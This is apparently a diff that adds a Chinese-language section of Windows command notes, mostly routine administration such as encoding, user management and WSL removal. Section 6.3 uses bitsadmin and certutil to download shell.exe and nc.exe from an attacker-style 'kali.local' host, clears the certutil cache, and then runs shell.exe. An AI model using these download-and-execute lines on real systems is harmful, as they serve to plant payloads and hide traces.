@@ -603,9 +603,281 @@ C:\Users\sec
 |                 [Xmind](https://xmind.app/)                  |
 |          [Yakit](https://github.com/yaklang/yakit)           |
 
+# 6 使用
+
+## 6.1 查看帮助
+
+```cmd
+C:\Users\Administrator> [command] /?
+```
+
+## 6.2 历史命令
+
+查看历史命令
+
+```cmd
+C:\Users\Administrator> doskey /history
+```
+
+## 6.3 远程下载
+
+**bitsadmin**
+
+使用 bitsadmin 下载文件
+
+```cmd
+C:\Users\Administrator> bitsadmin /transfer n http://kali.local/upload/shell.exe C:\Users\Administrator\shell.exe
+```
+
+```cmd
+C:\Users\Administrator> bitsadmin /rawreturn /transfer getfile http://kali.local/upload/shell.exe C:\Users\Administrator\shell.exe
+```
+
+**certutil**
+
+使用 certutil 下载文件
+
+```cmd
+C:\Users\Administrator> certutil -urlcache -split -f http://kali.local/upload/nc.exe C:\Users\Administrator\nc.exe
+```
+
+删除 certutil 下载记录
+
+```cmd
+C:\Users\Administrator> certutil -urlcache -split -f http://kali.local/upload/nc.exe delete
+```
+
+## 6.4 程序
+
+运行程序
+
+```cmd
+C:\Users\Administrator> start shell.exe
+```
+
+## 6.5 修改编码
+
+查看当前编码
+
+```cmd
+C:\Users\Administrator> chcp
+```
+
+修改编码为 UTF-8
+
+```cmd
+C:\Users\Administrator> chcp 65001
+```
+
+编码列表
+
+```
+65001	UTF-8		Unicode
+936		GB2312		简体中文
+936		GBK			简体中文，包括更多的字符
+950		Big5		繁体中文
+437		MS-DOS		美式英语
+932		Shift-JIS	日语
+949		EUC-KR		韩语
+```
+
+## 6.6 用户管理
+
+查看用户名
+
+```cmd
+C:\Users\Administrator> whoami
+```
+
+```cmd
+whoami
+a-win10-1903\administrator
+```
+
+添加用户
+
+```cmd
+C:\Users\Administrator> net user admin admin /add
+```
+
+```cmd
+net user admin admin /add
+The command completed successfully.
+```
+
+查看所有用户
+
+```cmd
+C:\Users\Administrator> net user
+```
+
+```cmd
+net user
+
+User accounts for \\A-WIN10-1903
+
+-------------------------------------------------------------------------------
+admin                    Administrator            DefaultAccount           
+Guest                    sec                      WDAGUtilityAccount       
+The command completed successfully.
+```
+
+查看用户信息
+
+```cmd
+C:\Users\Administrator> net user admin
+```
+
+```cmd
+net user admin
+User name                    admin
+Full Name                    
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            ?2024/?1/?2 15:47:13
+Password expires             ?2024/?2/?13 15:47:13
+Password changeable          ?2024/?1/?2 15:47:13
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Users                
+Global Group memberships     *None                 
+The command completed successfully.
+```
+
+删除用户
+
+```cmd
+C:\Users\Administrator> net user admin /del
+```
+
+```cmd
+net user admin /del
+The command completed successfully.
+```
+
+## 6.7 文件权限
+
+![文件权限](./../../../../../../images/Windows/%E4%BD%BF%E7%94%A8/%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90.png)
+
+## 6.8 查看进程
+
+```cmd
+C:\Users\Administrator> netstat -ano
+```
+
+## 6.9 查看系统架构
+
+```cmd
+C:\Users\Administrator> wmic os get osarchitecture
+```
+
+## 6.10 添加环境变量
+
+添加环境变量
+
+![添加环境变量](./../../../../../../images/Windows/%E4%BD%BF%E7%94%A8/%E6%B7%BB%E5%8A%A0%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F.png)
+
+> 添加多个变量时使用 `;` 间隔
+>
+> ```
+> Path
+> %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;D:\software\Microsoft VS Code\bin;D:\software\SDelete
+> ```
+
+## 6.11 临时文件夹
+
+```powershell
+PS C:\Users\sec> dir C:\Windows\Temp
+```
+
+## 6.12 添加快捷访问
+
+![添加快捷访问](./../../../../../../images/Windows/%E4%BD%BF%E7%94%A8/%E6%B7%BB%E5%8A%A0%E5%BF%AB%E6%8D%B7%E8%AE%BF%E9%97%AE.png)
+
+## 6.13 查看网络
+
+```cmd
+C:\Users\Administrator> route print
+```
+
+## 6.14 权限
+
+```
+SYSTEM : 系统权限，可对系统文件进行修改
+Administrator : 管理员权限，可对所有普通用户文件进行修改
+User : 普通用户权限
+Administrator : 可以通过 psexec 获取 SYSTEM 权限
+Administrator : 用户读取其它进程内存需要获取 debug 权限，SYSTEM 不需要
+```
+
+## 6.15 修复
+
+扫描系统文件的完整性，并修复受损的文件
+
+```cmd
+C:\Users\Administrator> sfc /scannow
+```
+
+## 6.16 禁用 WSL
+
+列出当前系统上安装的 WSL 发行版
+
+```powershell
+PS C:\Users\sec> wslconfig /l
+```
+
+删除 WSL 发行版
+
+```powershell
+PS C:\Users\sec> wsl --unregister <distribution name>
+```
+
+禁用 WSL 功能
+
+```powershell
+PS C:\Users\sec> Disable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
+```
+
+检查 WSL 状态
+
+```powershell
+PS C:\Users\sec> wslconfig /l
+```
+
+关闭虚拟机平台
+
+![关闭虚拟机平台](./../../../../../../images/Windows/%E4%BD%BF%E7%94%A8/%E5%85%B3%E9%97%AD%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B3%E5%8F%B0.png)
+
+## 6.17 删除
+
+要删除一个文件，你可以运行：
+
+```powershell
+Remove-Item "C:\path\to\file.txt"
+```
+
+要删除一个目录及其内容，你可以运行：
+
+```powershell
+Remove-Item "C:\path\to\directory" -Recurse
+```
+
 ---
 
 参考链接
 
-- [Microsoft Learn](https://learn.microsoft.com/zh-cn/windows/)
+- [Windows](https://learn.microsoft.com/zh-cn/windows/)
 
